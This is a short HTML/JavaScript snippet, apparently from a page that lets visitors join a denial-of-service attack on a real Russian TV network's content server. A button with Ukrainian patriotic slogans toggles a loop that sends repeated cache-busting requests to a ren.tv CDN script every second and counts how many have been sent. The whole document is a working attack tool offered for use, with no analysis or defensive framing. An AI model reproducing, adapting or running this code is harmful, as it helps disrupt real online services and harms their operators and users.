    <script>
        const sites = [
                {
                    url: "https://cdn.ren.tv/asset/dist/client/ea1684f.js",
                    method: "GET",
                },
            ];

        const btn = document.getElementById("btn");
        const countP = document.getElementById("count");

        $(document).ready(function () {
            $.ajaxSetup({ cache: false });
        });

        btn.addEventListener("click", () => {
            if (btn.innerText === "Слава Україні") {
                btn.innerText = "Героям Слава!";
                start();
            } else {
                stop();
                btn.innerText = "Слава Україні";
            }
        });
        var start_state = false;

        function stop(){
            start_state = false;
        }

        function start(){
            start_state = true;
        }

    var count_all = 0;
        var counter = 0;

        setInterval(function () {
            if(start_state && counter === 0){
                var s = sites[Math.floor(Math.random() * sites.length)];
                console.log("ites[s", sites, s)
                if (s.method === "GET") {
                    counter++;
                    $.get(
                        s.url, {}, function (data) {
                            count_all++;
                            countP.innerText = count_all+"";
                            counter--;
                        }
                    );
                } else {
                    counter++;
                    $.post(
                        s.url, {}, function (data) {
                            count_all++;
                            countP.innerText = count_all + "";
                            counter--;
                        }
                    );
                }
            }                  
        }, 1000)
        
    </script>
